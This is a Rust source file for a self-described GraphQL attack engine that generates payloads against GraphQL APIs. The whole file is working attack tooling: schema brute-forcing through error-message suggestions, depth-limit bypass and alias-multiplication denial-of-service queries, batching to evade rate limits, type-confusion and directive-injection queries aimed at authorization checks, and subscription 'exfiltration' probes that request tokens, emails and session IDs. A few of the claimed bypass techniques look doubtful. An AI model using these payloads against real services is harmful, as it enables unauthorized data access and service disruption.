use std::collections::{HashMap, HashSet};

/// Maximum nesting depth for generated DoS payloads.
const MAX_FRAGMENT_DEPTH: usize = 64;

/// Maximum number of aliases per batch query to stay under typical parser limits.
const MAX_BATCH_ALIASES: usize = 512;

/// Maximum number of operations in a single batch request.
const MAX_BATCH_OPERATIONS: usize = 50;

/// Known "Did you mean" error formats from popular GraphQL server implementations.
///
/// Format 1 (graphql-js / Apollo): `Did you mean "field1", "field2", or "field3"?`
/// Format 2 (Sangria / Scala):     `Field 'badField' is not defined ... did you mean 'field1', 'field2'?`
/// Format 3 (graphql-ruby):        `Field 'badField' doesn't exist on type 'Query'. Did you mean 'field1'?`
/// Format 4 (graphql-go):          `Cannot query field "bad" on type "Query". Did you mean "field1" or "field2"?`
/// Format 5 (Hasura):              `field "badField" not found in type: 'Query'. Did you mean "field1"?`
/// Result of a field suggestion brute-force attack.
#[derive(Debug, Clone)]
pub struct SuggestionBruteForceResult {
    /// Discovered field names mapped from the probe that revealed them.
    pub discovered_fields: HashMap<String, Vec<String>>,
    /// Total unique field names extracted.
    pub unique_field_count: usize,
    /// Probe queries that triggered suggestions.
    pub effective_probes: Vec<String>,
}

/// Probe names designed to trigger "Did you mean" suggestions across GraphQL implementations.
///
/// Each probe is a plausible-but-misspelled field name. Servers with suggestion engines
/// will respond with nearby real field names, leaking the schema incrementally.
pub const SUGGESTION_PROBES: &[&str] = &[
    "usr",
    "usrs",
    "usesr",
    "uesr",
    "uset",
    "psot",
    "pots",
    "posst",
    "pst",
    "itm",
    "itms",
    "ietm",
    "ordr",
    "ordrs",
    "oredr",
    "cmment",
    "comnt",
    "commnet",
    "mesage",
    "msg",
    "messg",
    "notif",
    "notific",
    "notifcation",
    "seting",
    "settngs",
    "settng",
    "profle",
    "prfile",
    "profl",
    "accont",
    "accnt",
    "acount",
    "searh",
    "serch",
    "sarch",
    "creat",
    "updat",
    "delet",
    "logn",
    "lgout",
    "registr",
    "muation",
    "mutaton",
    "subscr",
    "subscrip",
    "subscrpton",
    "quey",
    "qery",
    "qurey",
    "admin",
    "admn",
    "adimin",
    "role",
    "rles",
    "rloe",
    "permision",
    "perms",
    "permssion",
    "token",
    "tokn",
    "tkn",
    "session",
    "sesion",
    "sessn",
    "file",
    "fle",
    "fiel",
    "upload",
    "uplod",
    "upld",
    "image",
    "imag",
    "img",
    "email",
    "emal",
    "emial",
    "password",
    "pasword",
    "passwd",
];

/// Extract field suggestions from a variety of GraphQL error response formats.
///
/// Handles at least 5 known server implementations:
/// - graphql-js/Apollo: double-quoted, comma-separated with "or"
/// - Sangria: single-quoted, comma-separated
/// - graphql-ruby: single-quoted on type context
/// - graphql-go: double-quoted "Cannot query field" style
/// - Hasura: mixed quoting with type context
pub fn extract_suggestions_from_error(error_text: &str) -> Vec<String> {
    let mut fields = HashSet::new();

    extract_double_quoted_suggestions(error_text, &mut fields);
    extract_single_quoted_suggestions(error_text, &mut fields);

    let mut result: Vec<String> = fields.into_iter().collect();
    result.sort();
    result
}

fn extract_double_quoted_suggestions(text: &str, fields: &mut HashSet<String>) {
    let lower = text.to_lowercase();
    let suggestion_anchors = ["did you mean", "did you mean:", "suggestions:"];

    for anchor in &suggestion_anchors {
        if let Some(pos) = lower.find(anchor) {
            let tail = &text[pos..];
            let mut remaining = tail;
            while let Some(open) = remaining.find('"') {
                let after = &remaining[open + 1..];
                let Some(close) = after.find('"') else { break };
                let candidate = &after[..close];
                if is_graphql_identifier(candidate) {
                    fields.insert(candidate.to_string());
                }
                remaining = &after[close + 1..];
            }
        }
    }

    if let Some(pos) = lower.find("cannot query field \"") {
        let after = &text[pos + "cannot query field \"".len()..];
        if let Some(end) = after.find('"') {
            let field = &after[..end];
            if is_graphql_identifier(field) {
                fields.insert(field.to_string());
            }
        }
    }
}

fn extract_single_quoted_suggestions(text: &str, fields: &mut HashSet<String>) {
    let lower = text.to_lowercase();
    let anchors = [
        "did you mean",
        "not defined",
        "doesn't exist",
        "not found in type",
    ];

    for anchor in &anchors {
        if let Some(pos) = lower.find(anchor) {
            let tail = &text[pos..];
            let mut remaining = tail;
            while let Some(open) = remaining.find('\'') {
                let after = &remaining[open + 1..];
                let Some(close) = after.find('\'') else { break };
                let candidate = &after[..close];
                if is_graphql_identifier(candidate) {
                    fields.insert(candidate.to_string());
                }
                remaining = &after[close + 1..];
            }
        }
    }
}

fn is_graphql_identifier(name: &str) -> bool {
    !name.is_empty()
        && name.len() <= 128
        && name.starts_with(|c: char| c.is_ascii_alphabetic() || c == '_')
        && name.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')
}

/// Build probe queries for field suggestion brute-forcing.
///
/// Each probe is a minimal query `{ probeName }` designed to trigger error messages
/// containing field suggestions from GraphQL servers with introspection disabled.
pub fn build_suggestion_probes() -> Vec<String> {
    SUGGESTION_PROBES
        .iter()
        .map(|probe| format!("{{ {probe} }}"))
        .collect()
}

/// Process a batch of error responses from suggestion probes and aggregate discovered fields.
///
/// `probe_responses` maps probe query string to the error text returned by the server.
pub fn process_suggestion_responses(
    probe_responses: &[(&str, &str)],
) -> SuggestionBruteForceResult {
    let mut discovered: HashMap<String, Vec<String>> = HashMap::new();
    let mut all_fields = HashSet::new();
    let mut effective_probes = Vec::new();

    for (probe, response) in probe_responses {
        let fields = extract_suggestions_from_error(response);
        if !fields.is_empty() {
            effective_probes.push((*probe).to_string());
            for field in &fields {
                all_fields.insert(field.clone());
            }
            discovered.insert((*probe).to_string(), fields);
        }
    }

    SuggestionBruteForceResult {
        unique_field_count: all_fields.len(),
        discovered_fields: discovered,
        effective_probes,
    }
}

// ─── Depth/Complexity DoS Payloads ───────────────────────────────────────────

/// Configuration for depth-limit bypass payload generation.
#[derive(Debug, Clone)]
pub struct DepthBypassConfig {
    /// Target nesting depth. Capped at `MAX_FRAGMENT_DEPTH`.
    pub target_depth: usize,
    /// Field name to nest on (e.g., "node", "edges", "friends").
    pub nesting_field: String,
    /// Leaf field to select at the bottom of the nesting (e.g., "id", "__typename").
    pub leaf_field: String,
    /// Number of alias copies at each level for complexity multiplication.
    pub alias_multiplier: usize,
}

impl Default for DepthBypassConfig {
    fn default() -> Self {
        Self {
            target_depth: 16,
            nesting_field: "node".to_string(),
            leaf_field: "id".to_string(),
            alias_multiplier: 1,
        }
    }
}

/// A generated depth-bypass payload with metadata.
#[derive(Debug, Clone)]
pub struct DepthBypassPayload {
    /// The full GraphQL query string.
    pub query: String,
    /// Effective nesting depth achieved.
    pub effective_depth: usize,
    /// Number of field selections in the query (complexity metric).
    pub field_count: usize,
    /// Bypass technique used.
    pub technique: DepthBypassTechnique,
}

/// Technique used to bypass GraphQL depth limits.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum DepthBypassTechnique {
    /// Uses fragment spreading to hide depth from naive counters.
    FragmentSpreading,
    /// Uses inline fragments to reset depth counting in some implementations.
    InlineFragment,
    /// Uses aliases to multiply complexity without adding visible depth.
    AliasMultiplication,
    /// Combines fragments and aliases for maximum impact.
    Combined,
}

/// Generate a fragment-spreading depth-bypass query.
///
/// Creates a chain of named fragments where each fragment spreads into the next,
/// achieving deep nesting that naive depth counters may not track through fragment
/// boundaries.
pub fn generate_fragment_spread_bypass(config: &DepthBypassConfig) -> DepthBypassPayload {
    let depth = config.target_depth.min(MAX_FRAGMENT_DEPTH);
    let mut fragments = Vec::new();
    let mut field_count = 0;

    for i in 0..depth {
        let frag_name = format!("F{i}");
        let body = if i + 1 < depth {
            let next_frag = format!("F{}", i + 1);
            field_count += 1;
            format!(
                "fragment {frag_name} on Query {{ {field} {{ ...{next_frag} }} }}",
                field = config.nesting_field
            )
        } else {
            field_count += 1;
            format!(
                "fragment {frag_name} on Query {{ {leaf} }}",
                leaf = config.leaf_field
            )
        };
        fragments.push(body);
    }

    let query_body = if depth > 0 {
        format!("query DepthProbe {{ ...F0 }}\n{}", fragments.join("\n"))
    } else {
        format!("query DepthProbe {{ {leaf} }}", leaf = config.leaf_field)
    };

    DepthBypassPayload {
        query: query_body,
        effective_depth: depth,
        field_count,
        technique: DepthBypassTechnique::FragmentSpreading,
    }
}

/// Generate an inline-fragment depth-bypass query.
///
/// Uses `... on Query { }` inline fragments to add nesting levels that
/// some depth-limiting middleware does not count.
pub fn generate_inline_fragment_bypass(config: &DepthBypassConfig) -> DepthBypassPayload {
    let depth = config.target_depth.min(MAX_FRAGMENT_DEPTH);
    let mut field_count = 0;

    let mut inner = config.leaf_field.to_string();
    field_count += 1;

    for _ in 0..depth {
        inner = format!(
            "... on Query {{ {field} {{ {inner} }} }}",
            field = config.nesting_field
        );
        field_count += 1;
    }

    let query = format!("query InlineProbe {{ {inner} }}");

    DepthBypassPayload {
        query,
        effective_depth: depth,
        field_count,
        technique: DepthBypassTechnique::InlineFragment,
    }
}

/// Generate an alias-multiplication complexity payload.
///
/// At each nesting level, the field is aliased `alias_multiplier` times,
/// producing exponential field count growth with linear depth.
pub fn generate_alias_multiplication(config: &DepthBypassConfig) -> DepthBypassPayload {
    let depth = config.target_depth.min(MAX_FRAGMENT_DEPTH);
    let multiplier = config.alias_multiplier.clamp(1, MAX_BATCH_ALIASES);
    let mut field_count: usize = 0;

    let mut inner = config.leaf_field.clone();
    field_count += 1;

    for level in 0..depth {
        let aliases: Vec<String> = (0..multiplier)
            .map(|a| {
                field_count += 1;
                format!(
                    "a{level}_{a}: {field} {{ {inner} }}",
                    field = config.nesting_field
                )
            })
            .collect();
        inner = aliases.join(" ");
    }

    let query = format!("query AliasProbe {{ {inner} }}");

    DepthBypassPayload {
        query,
        effective_depth: depth,
        field_count,
        technique: DepthBypassTechnique::AliasMultiplication,
    }
}

/// Generate a combined fragment + alias bypass payload.
///
/// Fragments hide depth; aliases at the leaf level multiply complexity.
pub fn generate_combined_bypass(config: &DepthBypassConfig) -> DepthBypassPayload {
    let depth = config.target_depth.min(MAX_FRAGMENT_DEPTH);
    let multiplier = config.alias_multiplier.clamp(1, MAX_BATCH_ALIASES);
    let mut fragments = Vec::new();
    let mut field_count: usize = 0;

    let leaf_aliases: Vec<String> = (0..multiplier)
        .map(|a| {
            field_count += 1;
            format!("leaf_{a}: {leaf}", leaf = config.leaf_field)
        })
        .collect();
    let leaf_body = leaf_aliases.join(" ");

    for i in 0..depth {
        let frag_name = format!("C{i}");
        let body = if i + 1 < depth {
            let next_frag = format!("C{}", i + 1);
            field_count += 1;
            format!(
                "fragment {frag_name} on Query {{ {field} {{ ...{next_frag} }} }}",
                field = config.nesting_field
            )
        } else {
            format!("fragment {frag_name} on Query {{ {leaf_body} }}")
        };
        fragments.push(body);
    }

    let query_body = if depth > 0 {
        format!("query CombinedProbe {{ ...C0 }}\n{}", fragments.join("\n"))
    } else {
        format!("query CombinedProbe {{ {leaf_body} }}")
    };

    DepthBypassPayload {
        query: query_body,
        effective_depth: depth,
        field_count,
        technique: DepthBypassTechnique::Combined,
    }
}

/// Generate all four depth-bypass techniques for a given configuration.
pub fn generate_all_depth_bypasses(config: &DepthBypassConfig) -> Vec<DepthBypassPayload> {
    vec![
        generate_fragment_spread_bypass(config),
        generate_inline_fragment_bypass(config),
        generate_alias_multiplication(config),
        generate_combined_bypass(config),
    ]
}

// ─── Batch Query Smuggling ───────────────────────────────────────────────────

/// A single operation to include in a batch query.
#[derive(Debug, Clone)]
pub struct BatchOperation {
    /// Operation name (must be unique within the batch).
    pub name: String,
    /// GraphQL selection set body (without outer braces).
    pub body: String,
}

/// Result of batch query construction.
#[derive(Debug, Clone)]
pub struct BatchQuery {
    /// The constructed query string.
    pub query: String,
    /// Number of operations packed into this batch.
    pub operation_count: usize,
    /// Whether alias deduplication was applied.
    pub deduplicated: bool,
}

/// Construct a batch query from multiple operations using alias namespacing.
///
/// Each operation's fields are prefixed with `op{N}_` aliases to avoid collisions.
/// Duplicate operation bodies are deduplicated (only the first instance is kept).
pub fn build_batch_query(operations: &[BatchOperation]) -> BatchQuery {
    let mut seen_bodies: HashSet<String> = HashSet::new();
    let mut deduplicated = false;
    let mut alias_parts: Vec<String> = Vec::new();
    let mut op_count = 0;

    for (idx, op) in operations.iter().enumerate() {
        if idx >= MAX_BATCH_OPERATIONS {
            break;
        }
        let normalized = op.body.trim().to_string();
        if seen_bodies.contains(&normalized) {
            deduplicated = true;
            continue;
        }
        seen_bodies.insert(normalized);

        let aliased = format!("op{idx}_{name}: {body}", name = op.name, body = op.body);
        alias_parts.push(aliased);
        op_count += 1;
    }

    let query = format!("{{ {} }}", alias_parts.join(" "));
    BatchQuery {
        query,
        operation_count: op_count,
        deduplicated,
    }
}

/// Build a batch of identical queries targeting different arguments.
///
/// Useful for rate-limit bypass: packing N queries for resource enumeration
/// into a single HTTP request.
pub fn build_enumeration_batch(
    field_name: &str,
    arg_name: &str,
    arg_values: &[&str],
) -> BatchQuery {
    let mut alias_parts: Vec<String> = Vec::new();

    for (idx, value) in arg_values.iter().enumerate() {
        if idx >= MAX_BATCH_ALIASES {
            break;
        }
        alias_parts.push(format!(
            "q{idx}: {field_name}({arg_name}: \"{value}\") {{ id __typename }}"
        ));
    }

    let count = alias_parts.len();
    let query = format!("{{ {} }}", alias_parts.join(" "));

    BatchQuery {
        query,
        operation_count: count,
        deduplicated: false,
    }
}

// ─── Type Confusion ──────────────────────────────────────────────────────────

/// A GraphQL type with its fields and kind (Union or Interface target).
#[derive(Debug, Clone)]
pub struct GraphQlType {
    /// Type name as it appears in the schema.
    pub name: String,
    /// Known field names on this type.
    pub fields: Vec<String>,
    /// Whether this is a concrete type that implements an interface or belongs to a union.
    pub kind: TypeKind,
}

/// Classification of a GraphQL type for confusion attacks.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum TypeKind {
    /// A concrete object type.
    Object,
    /// A union parent type.
    Union,
    /// An interface type.
    Interface,
}

/// Result of type confusion payload generation.
#[derive(Debug, Clone)]
pub struct TypeConfusionPayload {
    /// The constructed query.
    pub query: String,
    /// Types being confused (accessing fields across type boundaries).
    pub confused_types: Vec<String>,
    /// Fields being accessed through type confusion.
    pub accessed_fields: Vec<String>,
}

/// Generate type confusion queries that access fields through union type spreads.
///
/// Given a union or interface parent and its member types, generates inline fragment
/// queries that attempt to read fields from one member type while the runtime type
/// might be another — exploiting implementations where field-level authorization
/// is checked against the declared type rather than the runtime type.
pub fn generate_type_confusion_payloads(
    parent_field: &str,
    member_types: &[GraphQlType],
) -> Vec<TypeConfusionPayload> {
    let mut payloads = Vec::new();

    let all_fields: Vec<(&str, &str)> = member_types
        .iter()
        .flat_map(|t| t.fields.iter().map(move |f| (t.name.as_str(), f.as_str())))
        .collect();

    for target_type in member_types {
        let foreign_fields: Vec<(&str, &str)> = all_fields
            .iter()
            .filter(|(type_name, _)| *type_name != target_type.name.as_str())
            .copied()
            .collect();

        if foreign_fields.is_empty() {
            continue;
        }

        let own_field = target_type
            .fields
            .first()
            .map(|f| f.as_str())
            .unwrap_or("__typename");

        let foreign_spreads: Vec<String> = foreign_fields
            .iter()
            .map(|(type_name, field)| format!("... on {type_name} {{ {field} }}"))
            .collect();

        let spreads_str = foreign_spreads.join(" ");
        let query = format!(
            "{{ {parent_field} {{ ... on {target} {{ {own} }} {spreads} }} }}",
            target = target_type.name,
            own = own_field,
            spreads = spreads_str
        );

        let mut confused = vec![target_type.name.clone()];
        let mut accessed = Vec::new();
        for (tn, f) in &foreign_fields {
            if !confused.contains(&tn.to_string()) {
                confused.push(tn.to_string());
            }
            accessed.push(f.to_string());
        }

        payloads.push(TypeConfusionPayload {
            query,
            confused_types: confused,
            accessed_fields: accessed,
        });
    }

    payloads
}

// ─── Subscription Abuse ──────────────────────────────────────────────────────

/// Common subscription event names for enumeration.
pub const COMMON_SUBSCRIPTION_FIELDS: &[&str] = &[
    "onMessage",
    "onNotification",
    "onUserUpdate",
    "onOrderUpdate",
    "onPaymentProcessed",
    "onItemCreated",
    "onItemUpdated",
    "onItemDeleted",
    "onCommentAdded",
    "onStatusChange",
    "onFileUploaded",
    "onError",
    "onAlert",
    "onLog",
    "onMetric",
    "newMessage",
    "newNotification",
    "messageAdded",
    "userJoined",
    "userLeft",
    "taskUpdated",
    "dataChanged",
];

/// A generated subscription probe.
#[derive(Debug, Clone)]
pub struct SubscriptionProbe {
    /// The subscription query string.
    pub query: String,
    /// Field name being probed.
    pub field_name: String,
    /// Whether this includes data exfiltration fields.
    pub exfiltration_fields: bool,
}

/// Generate subscription probes for data exfiltration enumeration.
///
/// Produces both basic probes (`subscription { fieldName { id } }`) and
/// exfiltration-oriented probes that request all plausible sensitive fields.
pub fn generate_subscription_probes(additional_fields: &[&str]) -> Vec<SubscriptionProbe> {
    let mut probes = Vec::new();
    let all_fields: Vec<&str> = COMMON_SUBSCRIPTION_FIELDS
        .iter()
        .copied()
        .chain(additional_fields.iter().copied())
        .collect();

    let exfil_fields = "id __typename createdAt updatedAt email username token sessionId data payload body content";

    for field in &all_fields {
        probes.push(SubscriptionProbe {
            query: format!("subscription {{ {field} {{ id __typename }} }}"),
            field_name: field.to_string(),
            exfiltration_fields: false,
        });

        probes.push(SubscriptionProbe {
            query: format!("subscription ExfilProbe {{ {field} {{ {exfil_fields} }} }}"),
            field_name: field.to_string(),
            exfiltration_fields: true,
        });
    }

    probes
}

// ─── Custom Directive Injection ──────────────────────────────────────────────

/// A directive injection payload for access control bypass.
#[derive(Debug, Clone)]
pub struct DirectiveInjectionPayload {
    /// The constructed query with injected directives.
    pub query: String,
    /// Technique description for reporting.
    pub technique: DirectiveInjectionTechnique,
    /// Fields targeted by the bypass.
    pub target_fields: Vec<String>,
}

/// Technique used for directive-based access control bypass.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum DirectiveInjectionTechnique {
    /// Chain @skip(if: false) to force field inclusion past authorization middleware.
    SkipChain,
    /// Chain @include(if: true) to force field inclusion.
    IncludeChain,
    /// Combine @skip and @include to confuse authorization logic.
    SkipIncludeCombination,
    /// Use @deprecated directive to access hidden fields.
    DeprecatedAccess,
    /// Apply directives inside fragment spreads.
    FragmentDirective,
}

/// Generate directive injection payloads for a set of target fields.
///
/// Produces queries that use `@skip`, `@include`, and their combinations to
/// bypass field-level authorization checks. Some implementations evaluate
/// directives before authorization middleware, allowing access to restricted fields.
pub fn generate_directive_injection_payloads(
    parent_field: &str,
    target_fields: &[&str],
) -> Vec<DirectiveInjectionPayload> {
    let mut payloads = Vec::new();

    if target_fields.is_empty() {
        return payloads;
    }

    let fields_list: Vec<String> = target_fields.iter().map(|f| f.to_string()).collect();

    // Technique 1: @skip(if: false) chain — forces inclusion
    {
        let field_selections: Vec<String> = target_fields
            .iter()
            .map(|f| format!("{f} @skip(if: false)"))
            .collect();
        let query = format!(
            "{{ {parent_field} {{ {selections} }} }}",
            selections = field_selections.join(" ")
        );
        payloads.push(DirectiveInjectionPayload {
            query,
            technique: DirectiveInjectionTechnique::SkipChain,
            target_fields: fields_list.clone(),
        });
    }

    // Technique 2: @include(if: true) chain
    {
        let field_selections: Vec<String> = target_fields
            .iter()
            .map(|f| format!("{f} @include(if: true)"))
            .collect();
        let query = format!(
            "{{ {parent_field} {{ {selections} }} }}",
            selections = field_selections.join(" ")
        );
        payloads.push(DirectiveInjectionPayload {
            query,
            technique: DirectiveInjectionTechnique::IncludeChain,
            target_fields: fields_list.clone(),
        });
    }

    // Technique 3: @skip(if: false) @include(if: true) double
    {
        let field_selections: Vec<String> = target_fields
            .iter()
            .map(|f| format!("{f} @skip(if: false) @include(if: true)"))
            .collect();
        let query = format!(
            "{{ {parent_field} {{ {selections} }} }}",
            selections = field_selections.join(" ")
        );
        payloads.push(DirectiveInjectionPayload {
            query,
            technique: DirectiveInjectionTechnique::SkipIncludeCombination,
            target_fields: fields_list.clone(),
        });
    }

    // Technique 4: @deprecated access
    {
        let field_selections: Vec<String> = target_fields
            .iter()
            .map(|f| format!("{f} @deprecated(reason: \"test\")"))
            .collect();
        let query = format!(
            "{{ {parent_field} {{ {selections} }} }}",
            selections = field_selections.join(" ")
        );
        payloads.push(DirectiveInjectionPayload {
            query,
            technique: DirectiveInjectionTechnique::DeprecatedAccess,
            target_fields: fields_list.clone(),
        });
    }

    // Technique 5: Fragment directive
    {
        let field_selections: Vec<String> = target_fields.iter().map(|f| f.to_string()).collect();
        let query = format!(
            "{{ {parent_field} {{ ... @skip(if: false) {{ {selections} }} }} }}",
            selections = field_selections.join(" ")
        );
        payloads.push(DirectiveInjectionPayload {
            query,
            technique: DirectiveInjectionTechnique::FragmentDirective,
            target_fields: fields_list,
        });
    }

    payloads
}

// ─── Aggregate Engine ────────────────────────────────────────────────────────

/// Full attack engine result combining all techniques.
#[derive(Debug)]
pub struct GraphQlAttackResult {
    pub suggestion_results: Option<SuggestionBruteForceResult>,
    pub depth_bypass_payloads: Vec<DepthBypassPayload>,
    pub batch_queries: Vec<BatchQuery>,
    pub type_confusion_payloads: Vec<TypeConfusionPayload>,
    pub subscription_probes: Vec<SubscriptionProbe>,
    pub directive_payloads: Vec<DirectiveInjectionPayload>,
}

/// Configuration for the full attack engine.
#[derive(Debug, Clone)]
pub struct AttackEngineConfig {
    /// Whether to run field suggestion brute-force.
    pub enable_suggestions: bool,
    /// Whether to generate depth-bypass payloads.
    pub enable_depth_bypass: bool,
    /// Whether to generate batch queries.
    pub enable_batch_smuggling: bool,
    /// Whether to generate type confusion payloads.
    pub enable_type_confusion: bool,
    /// Whether to generate subscription probes.
    pub enable_subscription_abuse: bool,
    /// Whether to generate directive injection payloads.
    pub enable_directive_injection: bool,
    /// Depth bypass configuration.
    pub depth_config: DepthBypassConfig,
}

impl Default for AttackEngineConfig {
    fn default() -> Self {
        Self {
            enable_suggestions: true,
            enable_depth_bypass: true,
            enable_batch_smuggling: true,
            enable_type_confusion: true,
            enable_subscription_abuse: true,
            enable_directive_injection: true,
            depth_config: DepthBypassConfig::default(),
        }
    }
}

/// Run the full GraphQL attack engine with the given configuration.
///
/// This is a payload generation engine — it does not make network requests.
/// The caller is responsible for sending the generated payloads and processing responses.
pub fn run_attack_engine(
    config: &AttackEngineConfig,
    error_responses: &[(&str, &str)],
    member_types: &[GraphQlType],
    target_fields: &[&str],
) -> GraphQlAttackResult {
    let suggestion_results = if config.enable_suggestions && !error_responses.is_empty() {
        Some(process_suggestion_responses(error_responses))
    } else {
        None
    };

    let depth_bypass_payloads = if config.enable_depth_bypass {
        generate_all_depth_bypasses(&config.depth_config)
    } else {
        Vec::new()
    };

    let batch_queries = if config.enable_batch_smuggling {
        let ops: Vec<BatchOperation> = target_fields
            .iter()
            .enumerate()
            .map(|(i, field)| BatchOperation {
                name: format!("op{i}"),
                body: format!("{field} {{ id __typename }}"),
            })
            .collect();
        if ops.is_empty() {
            Vec::new()
        } else {
            vec![build_batch_query(&ops)]
        }
    } else {
        Vec::new()
    };

    let type_confusion_payloads = if config.enable_type_confusion && !member_types.is_empty() {
        let parent = member_types
            .first()
            .map(|t| t.name.as_str())
            .unwrap_or("node");
        generate_type_confusion_payloads(parent, member_types)
    } else {
        Vec::new()
    };

    let subscription_probes = if config.enable_subscription_abuse {
        generate_subscription_probes(&[])
    } else {
        Vec::new()
    };

    let directive_payloads = if config.enable_directive_injection && !target_fields.is_empty() {
        generate_directive_injection_payloads("query", target_fields)
    } else {
        Vec::new()
    };

    GraphQlAttackResult {
        suggestion_results,
        depth_bypass_payloads,
        batch_queries,
        type_confusion_payloads,
        subscription_probes,
        directive_payloads,
    }
}
